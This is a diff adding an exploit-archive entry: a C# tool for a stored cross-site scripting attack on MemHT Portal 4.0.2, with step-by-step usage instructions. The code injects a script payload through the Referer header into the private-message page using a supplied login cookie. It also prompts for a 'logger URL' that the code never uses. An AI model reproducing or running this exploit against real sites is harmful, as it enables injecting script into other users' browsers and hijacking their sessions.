@@ -1,0 +1,70 @@
+id: 23679
+date: 05/26/2015
+title: MemHT Portal 4.0.2 Persistent XSS Exploit
+author: RangeMachine
+cves: 
+
+/**
+ * Stored XSS for MemHT Portal 4.0.2
+ * 
+ * Manual:
+ *  - Register on target site
+ *  - Grab login cookie (login_user=id#loginHash#passwordHash)
+ *  - Compile C# source and run it (xNet library is needed)
+ *  - Enter target site 
+ *  - Enter `login_user` cookie value
+ *  
+ * Copyright (c) 2015 Nuclear Software
+ */
+
+using System;
+using xNet.Net;
+
+namespace NuclearSoftware
+{
+    public class Program
+    {
+        static void Main(string[] args)
+        {
+            string address, login_cookie, logger_address = "";
+
+            Console.WriteLine("Stored XSS for MemHT Portal 4.0.2\n");
+            Console.Write("Enter target URL (http://localhost/) or (http://localhost/portal/): ");
+            address = Console.ReadLine();
+
+            Console.Write("Enter login cookie (id#loginHash#passwordHash): ");
+            login_cookie = Console.ReadLine();
+
+            Console.Write("Enter logger URL (http://localhost/logger.php): ");
+            logger_address = Console.ReadLine();
+
+            using (var request = new HttpRequest())
+            {
+                request.UserAgent = HttpHelper.ChromeUserAgent();
+                request.Referer = "http://ya.ru</a></body><body onload=alert('Hacked')>";
+                request.Cookies = new CookieDictionary()
+                {
+                    { "login_user", login_cookie },
+                };
+
+                HttpResponse response = request.Get(address + "index.php?page=pvtmsg&op=newMessage");
+                string content = response.ToString();
+
+                if (!content.Contains("denied"))
+                {
+                    Console.WriteLine("Logged in!");
+                    Console.WriteLine("XSS succesfully injected!");
+                }
+                else
+                {
+                    Console.WriteLine("Login failed!");
+                }
+            }
+
+            Console.ReadKey();
+        }
+    }
+}
+
+
+#  0day.today [2023-03-21]  #
